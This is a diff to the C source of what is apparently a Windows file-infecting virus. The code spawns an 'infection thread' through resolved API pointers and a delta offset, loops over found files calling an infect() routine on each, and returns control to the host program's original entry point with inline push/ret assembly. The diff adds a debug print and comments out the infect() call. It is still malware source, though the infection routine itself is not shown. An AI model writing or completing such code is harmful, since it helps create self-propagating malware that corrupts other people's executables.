@@ -19,6 +19,8 @@ void spawn_infection_thread(void) {
 
     if (init_data(&data, (void *)code_begin, (void *)code_end,
                   (void *)spawn_infection_thread) == 0) {
+        PRINT_DEBUG("initalized data for thread start, CreateThread diff = 0x%X\n",
+                    (int32_t)data.functions.createThread - (int32_t)CreateThread);
         HANDLE hThread = data.functions.createThread(
             NULL, 0,
             (LPTHREAD_START_ROUTINE)((uint8_t *)run + data.deltaOffset), NULL,
@@ -31,10 +33,7 @@ void spawn_infection_thread(void) {
     }
     size_t oep = get_original_entry_point();
     if (oep != OEP_DEFAULT) {
-        asm volatile("push %0\n"
-                     "ret"
-                     :
-                     : "r"(oep));
+        asm volatile("push %0\nret" : : "r"(oep));
     }
 }
 
@@ -53,11 +52,11 @@ static DWORD WINAPI run(LPVOID param) {
         if (hFind != INVALID_HANDLE_VALUE) {
             do {
                 PRINT_DEBUG("infecting %s...\n", findData.cFileName);
-                if (infect(findData.cFileName, &data) == 0)
+                /*if (infect(findData.cFileName, &data) == 0)
                     PRINT_DEBUG("success!\n");
                 else {
                     PRINT_DEBUG("failure!\n");
-                }
+                }*/
             } while (data.functions.findNextFileA(hFind, &findData));
             data.functions.findClose(hFind);
         }
